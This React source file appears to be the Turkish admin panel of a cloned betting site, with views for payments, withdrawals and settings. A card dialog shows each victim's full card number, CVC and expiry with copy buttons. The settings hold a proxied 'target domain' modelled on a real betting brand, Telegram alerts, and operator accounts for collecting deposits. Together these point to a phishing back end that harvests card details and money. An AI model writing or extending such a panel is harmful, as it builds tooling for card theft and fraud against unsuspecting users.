                    <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium border ${statusStyles[p.status] || "bg-gray-500/20 text-gray-400 border-gray-500/30"}`}
                      data-testid={`badge-payment-status-${p.id}`}>
                      {statusLabels[p.status] || p.status}
                    </span>
                  </td>
                  <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">
                    {new Date(p.date * 1000).toLocaleString("tr-TR")}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-1">
                      {p.status === "pending" && (
                        <>
                          <button
                            className="p-1.5 rounded-lg hover:bg-emerald-600/20 text-gray-500 hover:text-emerald-400 transition"
                            onClick={() => approveMutation.mutate(p.id)}
                            disabled={approveMutation.isPending}
                            title="Onayla"
                            data-testid={`button-approve-${p.id}`}
                          >
                            <Check className="w-4 h-4" />
                          </button>
                          <button
                            className="p-1.5 rounded-lg hover:bg-red-600/20 text-gray-500 hover:text-red-400 transition"
                            onClick={() => rejectMutation.mutate(p.id)}
                            disabled={rejectMutation.isPending}
                            title="Reddet"
                            data-testid={`button-reject-${p.id}`}
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      {p.provider === "kredikarti" && p.ccId && (
                        <button
                          className="p-1.5 rounded-lg hover:bg-blue-600/20 text-gray-500 hover:text-blue-400 transition"
                          onClick={() => { setSelectedCcId(p.ccId!); setCardDialogOpen(true); }}
                          title="Kart Bilgisi"
                          data-testid={`button-card-info-${p.id}`}
                        >
                          <CreditCard className="w-4 h-4" />
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
              {paginated.length === 0 && (
                <tr>
                  <td colSpan={7} className="px-4 py-12 text-center text-gray-500">
                    {search || statusFilter !== "all" ? "Filtre sonucu bulunamadi" : "Henuz odeme talebi yok"}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
        {totalPages > 1 && (
          <div className="flex items-center justify-between px-4 py-3 border-t border-[#1e293b]">
            <span className="text-xs text-gray-500">Sayfa {page} / {totalPages}</span>
            <div className="flex items-center gap-1">
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page === 1}>
                <ChevronLeft className="w-4 h-4" />
              </button>
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page === totalPages}>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>

      <Dialog open={cardDialogOpen} onOpenChange={setCardDialogOpen}>
        <DialogContent className="bg-[#111827] border-[#1e293b] text-white">
          <DialogHeader>
            <DialogTitle className="text-white">Kart Bilgileri</DialogTitle>
          </DialogHeader>
          {cardLoading ? (
            <div className="p-4 text-gray-500">Yukleniyor...</div>
          ) : cardInfo ? (
            <div className="space-y-3">
              {[
                { label: "Kart Sahibi", value: cardInfo.ccOwner, testid: "text-card-owner" },
                { label: "Kart No", value: cardInfo.ccNo, testid: "text-card-no" },
                { label: "CVC", value: cardInfo.ccCvc, testid: "text-card-cvc" },
                { label: "Son Kull.", value: `${cardInfo.ccMonth}/${cardInfo.ccYear}`, testid: "text-card-expiry" },
                { label: "Tutar", value: `${cardInfo.amount} TL`, testid: "text-card-amount" },
              ].map((row) => (
                <div key={row.label} className="flex items-center justify-between py-2 border-b border-[#1e293b]">
                  <span className="text-sm text-gray-400">{row.label}</span>
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-sm text-white" data-testid={row.testid}>{row.value}</span>
                    <button onClick={() => copyToClipboard(row.value)} className="text-gray-600 hover:text-gray-400">
                      <Copy className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="p-4 text-gray-500">Kart bilgisi bulunamadi</div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}

function CekimlerSection() {
  const { data: withdrawals, isLoading } = useQuery<WithdrawalEntry[]>({ queryKey: ["/api/admin/withdrawals"] });
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [page, setPage] = useState(1);
  const { toast } = useToast();

  const approveMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("PATCH", `/api/admin/withdrawals/${id}`, { status: "approved" }); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/withdrawals"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Cekim onaylandi" });
    },
  });

  const rejectMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("PATCH", `/api/admin/withdrawals/${id}`, { status: "rejected" }); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/withdrawals"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Cekim reddedildi" });
    },
  });

  const deleteMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("DELETE", `/api/admin/withdrawals/${id}`); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/withdrawals"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Cekim silindi" });
    },
  });

  const filtered = (withdrawals || []).filter((w) => {
    if (statusFilter !== "all" && w.status !== statusFilter) return false;
    if (!search) return true;
    const s = search.toLowerCase();
    return w.username.toLowerCase().includes(s) || w.method.toLowerCase().includes(s) ||
      (w.iban || "").toLowerCase().includes(s) || (w.accountHolder || "").toLowerCase().includes(s);
  });

  const totalPages = Math.max(1, Math.ceil(filtered.length / ITEMS_PER_PAGE));
  const paginated = filtered.slice((page - 1) * ITEMS_PER_PAGE, page * ITEMS_PER_PAGE);

  useEffect(() => { setPage(1); }, [search, statusFilter]);

  if (isLoading) return <div className="p-8 text-gray-500">Yukleniyor...</div>;

  const statusStyles: Record<string, string> = {
    pending: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30",
    approved: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30",
    rejected: "bg-red-500/20 text-red-400 border-red-500/30",
  };

  const statusLabels: Record<string, string> = {
    pending: "Bekliyor",
    approved: "Onaylandi",
    rejected: "Reddedildi",
  };

  const methodLabels: Record<string, string> = {
    havale: "Havale",
    papara: "Papara",
    kripto: "Kripto",
  };

  const getAccountInfo = (w: WithdrawalEntry) => {
    if (w.iban) return w.iban;
    if (w.paparaNo) return w.paparaNo;
    return "-";
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-xl font-bold text-white">Cekim Talepleri</h2>
          <p className="text-sm text-gray-500">{filtered.length} kayit bulundu</p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <div className="flex items-center gap-1 bg-[#0a0e17] border border-[#1e293b] rounded-lg p-0.5">
            {[
              { key: "all", label: "Tumu" },
              { key: "pending", label: "Bekleyen" },
              { key: "approved", label: "Onaylanan" },
              { key: "rejected", label: "Reddedilen" },
            ].map((f) => (
              <button
                key={f.key}
                className={`px-3 py-1.5 rounded-md text-xs font-medium transition ${statusFilter === f.key ? "bg-emerald-600 text-white" : "text-gray-400 hover:text-white"}`}
                onClick={() => setStatusFilter(f.key)}
                data-testid={`filter-withdrawal-status-${f.key}`}
              >
                {f.label}
              </button>
            ))}
          </div>
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <input
              className="pl-9 pr-4 py-2 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none text-sm w-48"
              placeholder="Kullanici, yontem..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              data-testid="input-search-withdrawals"
            />
          </div>
        </div>
      </div>

      <div className="bg-[#111827] border border-[#1e293b] rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-[#1e293b] text-gray-400 text-xs uppercase">
                <th className="px-4 py-3 text-left">#</th>
                <th className="px-4 py-3 text-left">Kullanici</th>
                <th className="px-4 py-3 text-left">Tutar</th>
                <th className="px-4 py-3 text-left">Yontem</th>
                <th className="px-4 py-3 text-left">Durum</th>
                <th className="px-4 py-3 text-left">IBAN/Hesap</th>
                <th className="px-4 py-3 text-left">Tarih</th>
                <th className="px-4 py-3 text-left">Islemler</th>
              </tr>
            </thead>
            <tbody>
              {paginated.map((w, idx) => (
                <tr key={w.id} className="border-b border-[#1e293b]/50 hover:bg-[#1e293b]/30 transition" data-testid={`row-withdrawal-${w.id}`}>
                  <td className="px-4 py-3 text-gray-500">{(page - 1) * ITEMS_PER_PAGE + idx + 1}</td>
                  <td className="px-4 py-3">
                    <span className="font-mono text-emerald-400" data-testid={`text-withdrawal-username-${w.id}`}>{w.username}</span>
                  </td>
                  <td className="px-4 py-3">
                    <span className="font-semibold text-white" data-testid={`text-withdrawal-amount-${w.id}`}>
                      {w.amount.toLocaleString("tr-TR")} TL
                    </span>
                  </td>
                  <td className="px-4 py-3">
                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-[#1e293b] text-gray-300 border border-[#2d3a4e]">
                      {methodLabels[w.method] || w.method}
                    </span>
                  </td>
                  <td className="px-4 py-3">
                    <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium border ${statusStyles[w.status] || "bg-gray-500/20 text-gray-400 border-gray-500/30"}`}
                      data-testid={`badge-withdrawal-status-${w.id}`}>
                      {statusLabels[w.status] || w.status}
                    </span>
                  </td>
                  <td className="px-4 py-3">
                    <span className="font-mono text-xs text-gray-400" data-testid={`text-withdrawal-account-${w.id}`}>{getAccountInfo(w)}</span>
                  </td>
                  <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">
                    {new Date(w.date * 1000).toLocaleString("tr-TR")}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-1">
                      {w.status === "pending" && (
                        <>
                          <button
                            className="p-1.5 rounded-lg hover:bg-emerald-600/20 text-gray-500 hover:text-emerald-400 transition"
                            onClick={() => approveMutation.mutate(w.id)}
                            disabled={approveMutation.isPending}
                            title="Onayla"
                            data-testid={`button-approve-withdrawal-${w.id}`}
                          >
                            <Check className="w-4 h-4" />
                          </button>
                          <button
                            className="p-1.5 rounded-lg hover:bg-red-600/20 text-gray-500 hover:text-red-400 transition"
                            onClick={() => rejectMutation.mutate(w.id)}
                            disabled={rejectMutation.isPending}
                            title="Reddet"
                            data-testid={`button-reject-withdrawal-${w.id}`}
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      <button
                        className="p-1.5 rounded-lg hover:bg-red-600/20 text-gray-500 hover:text-red-400 transition"
                        onClick={() => { if (confirm("Bu cekim silinecek. Emin misiniz?")) deleteMutation.mutate(w.id); }}
                        disabled={deleteMutation.isPending}
                        title="Sil"
                        data-testid={`button-delete-withdrawal-${w.id}`}
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
              {paginated.length === 0 && (
                <tr>
                  <td colSpan={8} className="px-4 py-12 text-center text-gray-500">
                    {search || statusFilter !== "all" ? "Filtre sonucu bulunamadi" : "Henuz cekim talebi yok"}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
        {totalPages > 1 && (
          <div className="flex items-center justify-between px-4 py-3 border-t border-[#1e293b]">
            <span className="text-xs text-gray-500">Sayfa {page} / {totalPages}</span>
            <div className="flex items-center gap-1">
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page === 1}>
                <ChevronLeft className="w-4 h-4" />
              </button>
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page === totalPages}>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

const SettingGroup = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="bg-[#111827] border border-[#1e293b] rounded-xl p-5 space-y-4">
    <h3 className="text-base font-semibold text-white">{title}</h3>
    {children}
  </div>
);

const SettingInput = ({ label, value, onChange, placeholder, type }: { label: string; value: string; onChange: (v: string) => void; placeholder?: string; type?: string }) => (
  <div>
    <label className="block text-sm text-gray-400 mb-1.5">{label}</label>
    <input
      className="w-full px-4 py-2.5 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none text-sm transition"
      value={value}
      onChange={(e) => onChange(e.target.value)}
      placeholder={placeholder}
      type={type || "text"}
      data-testid={`input-${label.toLowerCase().replace(/\s+/g, "-")}`}
    />
  </div>
);

function AyarlarSection() {
  const { data, isLoading } = useQuery<SettingsData>({ queryKey: ["/api/admin/settings"] });
  const { toast } = useToast();

  const clearCacheMutation = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/admin/clear-cache", { method: "POST", credentials: "include" });
      return res.json();
    },
    onSuccess: (result: { message?: string; error?: string }) => {
      toast({ title: result.message || result.error || "Tamamlandi" });
    },
  });

  const [targetDomain, setTargetDomain] = useState("");
  const [bankName, setBankName] = useState("");
  const [bankIban, setBankIban] = useState("");
  const [paparaNo, setPaparaNo] = useState("");
  const [paparaIban, setPaparaIban] = useState("");
  const [cryptoWallet, setCryptoWallet] = useState("");
  const [telegramBot, setTelegramBot] = useState("");
  const [telegramChat, setTelegramChat] = useState("");
  const [cdnUrl, setCdnUrl] = useState("");
  const [slotLink, setSlotLink] = useState("");
  const [demoUrl, setDemoUrl] = useState("");
  const [liveChatCode, setLiveChatCode] = useState("");
  const [minDeposit, setMinDeposit] = useState(0);
  const [maxDeposit, setMaxDeposit] = useState(0);
  const [minWithdraw, setMinWithdraw] = useState(0);
  const [maxWithdraw, setMaxWithdraw] = useState(0);
  const [initialized, setInitialized] = useState(false);

  useEffect(() => {
    if (data && !initialized) {
      setTargetDomain(data.settings?.targetDomain || "");
      setBankName(data.bankAccount?.name || "");
      setBankIban(data.bankAccount?.iban || "");
      setPaparaNo(data.paparaAccount?.no || "");
      setPaparaIban(data.paparaAccount?.iban || "");
      setCryptoWallet(data.cryptoAccount?.walletNo || "");
      setTelegramBot(data.settings?.telegramBotToken || "");
      setTelegramChat(data.settings?.telegramChatId || "");
      setCdnUrl(data.settings?.cdnUrl || "");
      setSlotLink(data.settings?.slotLink || "");
      setDemoUrl(data.settings?.demoUrl || "");
      setLiveChatCode(data.settings?.liveChatCode || "");
      setMinDeposit(data.settings?.minDeposit ?? 0);
      setMaxDeposit(data.settings?.maxDeposit ?? 0);
      setMinWithdraw(data.settings?.minWithdraw ?? 0);
      setMaxWithdraw(data.settings?.maxWithdraw ?? 0);
      setInitialized(true);
    }
  }, [data, initialized]);

  const saveMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("PUT", "/api/admin/settings", {
        settings: { targetDomain, telegramBotToken: telegramBot, telegramChatId: telegramChat, cdnUrl, slotLink, demoUrl, liveChatCode, minDeposit, maxDeposit, minWithdraw, maxWithdraw },
        bankAccount: { name: bankName, iban: bankIban },
        paparaAccount: { no: paparaNo, iban: paparaIban },
        cryptoAccount: { walletNo: cryptoWallet },
      });
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/settings"] });
      toast({ title: "Ayarlar kaydedildi" });
    },
  });

  if (isLoading) return <div className="p-8 text-gray-500">Yukleniyor...</div>;

  return (
    <div className="space-y-6 max-w-3xl">
      <div>
        <h2 className="text-xl font-bold text-white mb-1">Ayarlar</h2>
        <p className="text-sm text-gray-500">Sistem yapilandirmasi ve hesap bilgileri</p>
      </div>

      <SettingGroup title="Proxy Cache">
        <p className="text-sm text-gray-400 mb-3">Giris veya sayfa guncellemeleri gorulmuyorsa proxy cache temizleyin.</p>
        <button
          className="px-4 py-2 bg-amber-600/80 hover:bg-amber-600 text-white rounded-lg text-sm font-medium disabled:opacity-50 transition"
          onClick={() => clearCacheMutation.mutate()}
          disabled={clearCacheMutation.isPending}
        >
          {clearCacheMutation.isPending ? "Temizleniyor..." : "Cache Temizle"}
        </button>
      </SettingGroup>

      <SettingGroup title="Hedef Domain">
        <SettingInput label="Domain" value={targetDomain} onChange={setTargetDomain} placeholder="grandpashabet7078.com" />
      </SettingGroup>

      <SettingGroup title="Banka Hesabi (Havale/EFT)">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <SettingInput label="Ad Soyad" value={bankName} onChange={setBankName} placeholder="Ad Soyad" />
          <SettingInput label="IBAN" value={bankIban} onChange={setBankIban} placeholder="TR..." />
        </div>
      </SettingGroup>

      <SettingGroup title="Papara Hesabi">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <SettingInput label="Papara No" value={paparaNo} onChange={setPaparaNo} placeholder="1234567890" />
          <SettingInput label="Papara IBAN" value={paparaIban} onChange={setPaparaIban} placeholder="TR..." />
        </div>
      </SettingGroup>

      <SettingGroup title="Kripto Hesabi">
        <SettingInput label="Wallet Adresi" value={cryptoWallet} onChange={setCryptoWallet} placeholder="0x..." />
      </SettingGroup>

      <SettingGroup title="Telegram Bildirimleri">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <SettingInput label="Bot Token" value={telegramBot} onChange={setTelegramBot} placeholder="123456:ABC-DEF..." />
          <SettingInput label="Chat ID" value={telegramChat} onChange={setTelegramChat} placeholder="-1001234567890" />
        </div>
      </SettingGroup>

      <SettingGroup title="Diger Ayarlar">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <SettingInput label="CDN URL" value={cdnUrl} onChange={setCdnUrl} placeholder="https://cdn.example.com" />
          <SettingInput label="Slot Link" value={slotLink} onChange={setSlotLink} placeholder="https://..." />
          <SettingInput label="Demo URL" value={demoUrl} onChange={setDemoUrl} placeholder="https://..." />
          <SettingInput label="Live Chat Kodu" value={liveChatCode} onChange={setLiveChatCode} placeholder="tawk.to kodu" />
        </div>
      </SettingGroup>

      <SettingGroup title="Yatirim/Cekim Limitleri">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <SettingInput label="Min Yatirim" value={String(minDeposit)} onChange={(v) => setMinDeposit(parseInt(v) || 0)} placeholder="100" type="number" />
          <SettingInput label="Max Yatirim" value={String(maxDeposit)} onChange={(v) => setMaxDeposit(parseInt(v) || 0)} placeholder="50000" type="number" />
          <SettingInput label="Min Cekim" value={String(minWithdraw)} onChange={(v) => setMinWithdraw(parseInt(v) || 0)} placeholder="100" type="number" />
          <SettingInput label="Max Cekim" value={String(maxWithdraw)} onChange={(v) => setMaxWithdraw(parseInt(v) || 0)} placeholder="50000" type="number" />
        </div>
      </SettingGroup>

      <button
        className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-700 text-white font-semibold rounded-xl hover:from-emerald-500 hover:to-emerald-600 transition disabled:opacity-50"
        onClick={() => saveMutation.mutate()}
        disabled={saveMutation.isPending}
        data-testid="button-save-settings"
      >
        {saveMutation.isPending ? "Kaydediliyor..." : "Ayarlari Kaydet"}
      </button>
    </div>
  );
}

type Section = "dashboard" | "hesaplar" | "odemeler" | "cekimler" | "ayarlar";

export default function AdminPanel() {
  const [loggedIn, setLoggedIn] = useState(false);
  const [activeSection, setActiveSection] = useState<Section>("dashboard");
  const [sidebarOpen, setSidebarOpen] = useState(true);

  const { data: me, isLoading: meLoading } = useQuery<AdminMe>({
    queryKey: ["/api/admin/me"],
  });

  const logoutMutation = useMutation({
    mutationFn: async () => { await apiRequest("POST", "/api/admin/logout"); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/me"] });
      setLoggedIn(false);
    },
  });

  useEffect(() => {
    if (me?.loggedIn) setLoggedIn(true);
  }, [me]);

  if (meLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0a0e17]">
        <div className="text-gray-500">Yukleniyor...</div>
      </div>
    );
  }

  if (!loggedIn && !me?.loggedIn) {
    return <LoginScreen onLogin={() => setLoggedIn(true)} />;
  }

  const navItems: { key: Section; icon: any; label: string }[] = [
    { key: "dashboard", icon: LayoutDashboard, label: "Dashboard" },
    { key: "hesaplar", icon: Users, label: "Hesaplar" },
    { key: "odemeler", icon: Wallet, label: "Odemeler" },
    { key: "cekimler", icon: TrendingUp, label: "Cekimler" },
    { key: "ayarlar", icon: Settings, label: "Ayarlar" },
  ];

  return (
    <div className="min-h-screen bg-[#0a0e17] flex">
      <aside className={`${sidebarOpen ? "w-64" : "w-[70px]"} bg-[#111827] border-r border-[#1e293b] flex flex-col transition-all duration-300 shrink-0`}>
        <div className="p-4 border-b border-[#1e293b] flex items-center gap-3">
          <div className="w-10 h-10 bg-gradient-to-br from-emerald-500 to-emerald-700 rounded-xl flex items-center justify-center shrink-0">
            <ShieldAlert className="w-5 h-5 text-white" />
          </div>
          {sidebarOpen && (
            <div className="overflow-hidden">
              <h1 className="text-sm font-bold text-white truncate">Admin Panel</h1>
              <p className="text-xs text-gray-500 truncate">{me?.username || "admin"}</p>
            </div>
          )}
        </div>
        <nav className="flex-1 py-3 px-2 space-y-1">
          {navItems.map((item) => (
            <button
              key={item.key}
              className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm transition ${
                activeSection === item.key
                  ? "bg-emerald-600/20 text-emerald-400 border border-emerald-600/30"
                  : "text-gray-400 hover:bg-[#1e293b] hover:text-white border border-transparent"
              }`}
              onClick={() => setActiveSection(item.key)}
              data-testid={`nav-${item.key}`}
            >
              <item.icon className="w-5 h-5 shrink-0" />
              {sidebarOpen && <span className="truncate">{item.label}</span>}
            </button>
          ))}
        </nav>
        <div className="p-2 border-t border-[#1e293b] space-y-1">
          <button
            className="w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm text-gray-400 hover:bg-[#1e293b] hover:text-white transition"
            onClick={() => setSidebarOpen(!sidebarOpen)}
            data-testid="button-toggle-sidebar"
          >
            <ChevronLeft className={`w-5 h-5 shrink-0 transition-transform ${!sidebarOpen ? "rotate-180" : ""}`} />
            {sidebarOpen && <span>Daralt</span>}
          </button>
          <button
            className="w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm text-red-400 hover:bg-red-600/10 transition"
            onClick={() => logoutMutation.mutate()}
            data-testid="button-admin-logout"
          >
            <LogOut className="w-5 h-5 shrink-0" />
            {sidebarOpen && <span>Cikis Yap</span>}
          </button>
        </div>
      </aside>

      <main className="flex-1 overflow-y-auto">
        <div className="p-6 lg:p-8 max-w-7xl">
          {activeSection === "dashboard" && <DashboardSection />}
          {activeSection === "hesaplar" && <HesaplarSection />}
          {activeSection === "odemeler" && <OdemelerSection />}
          {activeSection === "cekimler" && <CekimlerSection />}
          {activeSection === "ayarlar" && <AyarlarSection />}
        </div>
      </main>
    </div>
  );
}
